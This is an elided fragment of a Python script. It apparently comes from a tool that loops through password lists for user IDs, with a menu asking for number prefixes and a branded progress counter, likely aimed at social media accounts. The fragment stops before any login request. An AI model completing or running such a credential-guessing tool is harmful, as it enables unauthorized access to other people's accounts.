...
def numb():
    ...
    print(n2)
    space()
    print("    [bold red]CODE               [bold yellow] ✓ [bold green]Example 750, 770, 751, ")
    code=input("                        ✓ Choice ->")
...
def need(uid,pwx,fb,tl):
    ...
    sys.stdout.write(f"\r  \33[1;90m[\33[1;97mMR,VEAR\33[1;92m | {'{:.1%}'.format(loop/int(tl))} | \33[1;97m{loop} \33[1;90m] \r "),
    sys.stdout.flush()
    try:
        for ps in pwx:
